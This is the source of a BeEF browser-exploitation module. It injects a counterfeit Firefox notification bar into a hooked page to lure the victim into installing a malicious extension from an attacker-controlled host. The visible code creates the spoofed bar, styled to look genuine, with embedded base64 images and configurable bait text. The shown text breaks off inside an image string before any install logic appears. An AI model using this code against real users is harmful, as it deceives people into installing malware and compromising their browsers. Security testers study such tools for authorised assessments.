//
// Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    var xpi_name = '<%= @xpi_name %>';
    var base_host ='<%= @base_host %>';
    var ff_extension = '/' + xpi_name + '.xpi';

    if(beef.browser.isFF()){
        var id = beef.dom.generateID();
        var pid = beef.dom.generateID();
        var zztop = beef.dom.getHighestZindex()+1;
        var el = beef.dom.createElement('div',{'id':id,'style':'width:100%; position:fixed; top:0px; left:0px; margin:0; padding:0px 20px 0px 20px; z-index:'+zztop+'; border-bottom:1px solid black; background:#fbe99a; display:none;'});
        var elr = beef.dom.createElement('div',{'style':'width: 8px; height: 8px; padding: 0; margin: 7px 50px 5px 0px; position: absolute; right: 0px; top: 0px; background-image: url(data:image/png;base64,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);'})
        var elp = beef.dom.createElement('div',{'id':pid,'style':'margin: 2px 50px 0 4px; height: 25px; line-height: 25px; font-family: sans-serif; font-size: 12px; padding-bottom: 5px'});
        $j('body').append(el);
        var hid = '#'+id;
        var hpid = '#'+pid;
        $j(hid).append(elp);
        $j(hpid).html("<%= @notification_text %>&nbsp;<img style='padding:0; margin:5px; position: absolute; top: 0;' src='data:image/png;base64,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